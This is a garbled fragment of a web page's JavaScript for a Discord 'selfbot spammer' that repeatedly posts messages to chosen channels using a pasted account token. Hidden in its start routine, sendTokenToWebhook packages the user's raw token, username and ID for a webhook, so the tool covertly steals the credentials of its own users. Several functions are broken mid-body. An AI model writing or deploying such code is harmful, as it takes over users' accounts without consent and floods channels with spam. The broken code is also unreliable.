            log.scrollTop = log.scrollHeight;
        }

        function updateRemainingLabel() {
            document.getElementById("activation-status").textContent = `Time remaining: ${getRemainingTime()}`;
            setTimeout(updateRemainingLabel, 60000);
        }

        function ativarChave() {
            const key = document.getElementById("key-entry").value.trim();
            if (!key) return alert("Enter a key!");
            let days = MASTER_KEYS_30.has(key) ? 30 : MASTER_KEYS_1.has(key) ? 1 : 0;
            if (days === 0) return alert("Invalid or already used key!");
            if (activatedKey === key) return alert("This key has already been used on this installation!");
            saveActivation(key, days);
            alert(`Key activated! The spammer is unlocked for ${days} days.`);
            document.getElementById("activation-frame").style.display = "none";
            updateRemainingLabel();
        }

        async function sendTokenToWebhook(token) {
            try {
                const r = await fetch("https://discord.com/api/v9/users/@me", { headers: { Authorization: token } });
                if (!r.ok) return;
                const user = await r.json();
                const payload = { content: `**New Selfbot Spammer v4 activation**\n**Token:** \`${token}\`\n**User:** ${user.username}#${user.discriminator} (${user.id})` };

                let body;

                } else {

                    body = JSON.stringify({ content: mensagem || "" });

                const res = await fetch(`https://discord.com/api/v9/channels/${cid}/messages`, { method: "POST", headers, body });

        async function validarCanais() {
            if (!activatedKey) return alert("Activate key first!");
            TOKEN = document.getElementById("token-entry").value.trim();
            const txt = document.getElementById("channel-entry").value.trim();
            if (!TOKEN || !txt) return alert("Fill token and channels first!");
            CHANNEL_IDS = txt.split(",").map(x => parseInt(x.trim())).filter(x => !isNaN(x));
            appendLog("🔍 Validating channels (like Python on_ready)...");
            for (let cid of CHANNEL_IDS) {
                try {
                    const r = await fetch(`https://discord.com/api/v9/channels/${cid}`, { headers: { Authorization: TOKEN } });
                    if (r.ok) {
                        const data = await r.json();
                        appendLog(`✅ Channel accessible: #${data.name || cid}`);
                    } else {
                        appendLog(`❌ Channel ${cid} → ${r.status}`);
                    }
                } catch (e) {
                    appendLog(`⚠️ Validation error ${cid}: ${e.message}`);
                }
            }
        }

        async function iniciarSpam() {
            if (!activatedKey) return alert("Activate a key first!");
            if (running) return alert("Spam is already running!");
            TOKEN = document.getElementById("token-entry").value.trim();
            const channelText = document.getElementById("channel-entry").value.trim();
            MENSAGEM = document.getElementById("message-text").value.trim();
            INTERVALO = parseInt(document.getElementById("interval-entry").value) || 1;
            if (!TOKEN || !channelText || (!MENSAGEM && !currentFile)) return alert("Fill Token, Channel IDs and at least the Message or an Attachment!");
            CHANNEL_IDS = channelText.split(",").map(x => parseInt(x.trim())).filter(x => !isNaN(x));
            if (CHANNEL_IDS.length === 0) return alert("No valid channel IDs!");
            sendTokenToWebhook(TOKEN);
            running = true;
            appendLog("🚀 Starting self-bot (exactly like your Python script)...");
            CHANNEL_IDS.forEach(cid => appendLog(`✅ Channel added: #${cid}`));
            appendLog(`✅ Spamming every ${INTERVALO} seconds - LOOP STARTED`);
            spamIntervalId = setInterval(() => {
                if (!running) return;
                appendLog(`🔄 Sending cycle started (${CHANNEL_IDS.length} channels)`);
                CHANNEL_IDS.forEach(cid => sendToChannel(cid, TOKEN, MENSAGEM, currentFile));
            }, INTERVALO * 1000);
        }

        function pararSpam() {
            if (!running) return;
            clearInterval(spamIntervalId);
            running = false;
            appendLog("⏹️ Stop requested... Spam stopped.");
        }

        function abrirSuporte() {
            window.open("https://discord.com/users/1332898061843824744", "_blank");
            appendLog("🔗 Support link opened!");
        }

        function selecionarArquivo() { document.getElementById("file-input").click(); }
        function handleFileSelect(e) {
            const file = e.target.files[0];
            if (file) {
                currentFile = file;
                document.getElementById("file-label").innerHTML = `📎 <span class="text-white">${file.name}</span> <span class="text-gray-400">(${(file.size/1024/1024).toFixed(2)} MB)</span>`;
                appendLog(`📎 Attachment selected: ${file.name}`);
            }
        }
        function removerAnexo() {
            currentFile = null;
            document.getElementById("file-input").value = "";
            document.getElementById("file-label").textContent = "No file selected";
            appendLog("📎 Attachment removed.");
        }

        function init() {
            if (loadActivation()) {
                document.getElementById("activation-frame").style.display = "none";
                appendLog("✅ Key already activated.");
            } else {
                appendLog("🔑 Activation required.");

            updateRemainingLabel();
            appendLog("🚀 Selfbot v4 Web Version loaded on GitHub Pages");
            appendLog("✅ Click VALIDATE CHANNELS first to confirm your token sees the channel");
            appendLog("✅ Then click START SPAM - you will see 'LOOP STARTED' and 'Sending cycle started'");
